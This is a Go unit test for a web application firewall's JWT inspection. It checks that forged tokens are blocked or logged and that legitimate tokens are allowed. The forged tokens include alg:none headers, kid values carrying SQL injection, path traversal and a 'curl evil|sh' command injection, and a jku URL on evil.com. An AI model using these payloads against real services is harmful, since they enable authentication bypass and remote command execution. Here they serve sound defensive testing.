package engine

import (
	"encoding/base64"
	"net/http"
	"net/http/httptest"
	"testing"

	"wewaf/internal/core"
)

func jwtSeg(s string) string { return base64.RawURLEncoding.EncodeToString([]byte(s)) }

func jwtAuthBlocked(eng *Engine, bearer string) bool {
	req := httptest.NewRequest(http.MethodGet, "/api/me", nil)
	req.Header.Set("Authorization", "Bearer "+bearer)
	tx := core.NewTransaction(nil, req, nil)
	return eng.ProcessRequestHeaders(tx) != nil
}

func jwtRuleMatched(eng *Engine, bearer, ruleID string) bool {
	req := httptest.NewRequest(http.MethodGet, "/api/me", nil)
	req.Header.Set("Authorization", "Bearer "+bearer)
	tx := core.NewTransaction(nil, req, nil)
	eng.ProcessRequestHeaders(tx)
	for _, m := range tx.MatchesSnapshot() {
		if m.RuleID == ruleID {
			return true
		}
	}
	return false
}

// TestJWTHeaderAttacks validates decoding-based JWT inspection: alg:none, kid
// injection (SQLi/LFI/command), and jku/x5u external key references — none of
// which are visible to regex rules because the JWT is base64url-encoded.
func TestJWTHeaderAttacks(t *testing.T) {
	eng := newFuzzEngine(t)
	block := map[string]string{
		"alg_none": jwtSeg(`{"alg":"none","typ":"JWT"}`) + "." + jwtSeg(`{"u":"admin"}`) + ".",
		"alg_None": jwtSeg(`{"alg":"NoNe"}`) + "." + jwtSeg(`{"u":"a"}`) + ".",
		"kid_sqli": jwtSeg(`{"alg":"HS256","kid":"x' UNION SELECT 'k"}`) + "." + jwtSeg(`{"u":"a"}`) + ".s",
		"kid_lfi":  jwtSeg(`{"alg":"HS256","kid":"../../../../dev/null"}`) + "." + jwtSeg(`{"u":"a"}`) + ".s",
		"kid_cmd":  jwtSeg(`{"alg":"HS256","kid":"k;curl evil|sh"}`) + "." + jwtSeg(`{"u":"a"}`) + ".s",
	}
	for name, tok := range block {
		name, tok := name, tok
		t.Run("block_"+name, func(t *testing.T) {
			if !jwtAuthBlocked(eng, tok) {
				t.Errorf("JWT attack %s not blocked", name)
			}
		})
	}
	// jku/x5u are log-level (JWT-004), not blocked.
	jku := jwtSeg(`{"alg":"RS256","jku":"https://evil.com/jwks.json"}`) + "." + jwtSeg(`{"u":"a"}`) + ".s"
	if !jwtRuleMatched(eng, jku, "JWT-004") {
		t.Errorf("jku external key source not detected (JWT-004)")
	}
	// Legit JWTs must not be blocked.
	legit := []string{
		jwtSeg(`{"alg":"HS256","typ":"JWT","kid":"prod-2024"}`) + "." + jwtSeg(`{"sub":"alice","exp":1700000000}`) + ".dozjgNryP4J3jVmNHl0w5N",
		jwtSeg(`{"alg":"RS256","kid":"abc123:key-1"}`) + "." + jwtSeg(`{"sub":"bob"}`) + ".sigvalue",
		jwtSeg(`{"alg":"ES256","typ":"JWT"}`) + "." + jwtSeg(`{"name":"O'Brien"}`) + ".sig", // quote in payload only
	}
	for _, tok := range legit {
		tok := tok
		t.Run("allow", func(t *testing.T) {
			if jwtAuthBlocked(eng, tok) {
				t.Errorf("legit JWT wrongly blocked: %q", tok)
			}
		})
	}
}
